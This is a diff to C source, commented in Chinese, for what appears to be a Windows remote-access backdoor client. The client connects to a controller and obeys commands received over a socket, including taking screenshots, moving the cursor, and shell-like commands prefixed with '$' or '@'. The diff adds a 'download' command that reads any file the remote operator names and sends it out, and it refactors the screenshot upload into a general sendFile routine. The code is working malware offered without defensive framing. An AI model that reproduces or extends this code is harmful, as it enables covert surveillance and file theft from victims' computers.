@@ -4,9 +4,12 @@
 #include <windows.h>
 #include <winable.h>
 #pragma comment(lib, "ws2_32.lib")
+/*
 #ifdef _MSC_VER  
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
+*/
+
 
 #define MSG_LEN 1024
 
@@ -16,15 +19,17 @@ int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);
 
 
 // 发送文件
-int sendImage(SOCKET client) 
+int sendFile(SOCKET client, char *filename) 
 {		
     char sendbuf[1024];
     DWORD        dwRead;  
-    BOOL         bRet;  
-    char filename[]="screen.png";
+    BOOL         bRet;
 	Sleep(100);
 
-    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);  
+    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+	if(hFile==INVALID_HANDLE_VALUE) {
+		return 1;
+	}
     while(1) {  //发送文件的buf
         bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
         if(bRet==FALSE) break;
@@ -35,9 +40,11 @@ int sendImage(SOCKET client)
             send(client,sendbuf,dwRead,0);
         }  
     }
-	send(client,"EOF",strlen("EOF")+1,0);
+	send(client,"EOFYY",strlen("EOFYY")+1,0);
     CloseHandle(hFile);
-	system("del screen.png");
+	if (strcmp(filename,"screen.png")==0) {
+		system("del screen.png");
+	}
 	
 	return 0;
 }
@@ -222,7 +229,6 @@ void c_socket()
 	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
 	if ( iResult != NO_ERROR )
 			//printf("Error at WSAStartup()\n");
-
 	while(1){
 
 		//解析主机地址
@@ -309,7 +315,7 @@ void c_socket()
 			exit(0);
 		}else if(strcmp(recvCmd,"screenshot")==0){  //截屏
 			CaptureImage(GetDesktopWindow(), "./", "screen"); //保存screen.png
-			sendImage(client);
+			sendFile(client,"screen.png");
 			continue;
 		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
 			int i;
@@ -335,6 +341,13 @@ void c_socket()
 			continue;
 		}else if(strcmp(recvCmd,"mouse")==0){ //重置光标
 			SetCursorPos(0,0);
+			continue;
+		}else if(strcmp(recvCmd,"download")==0){ //上传文件
+			ZeroMemory(recvCmd, sizeof(recvCmd));
+			recv(client, recvCmd, MSG_LEN, 0);
+			if(sendFile(client,recvCmd)) {
+				send(client,"EOFNN",strlen("EOFNN")+1,0);
+			}
 			continue;
 		}else{
 			continue;
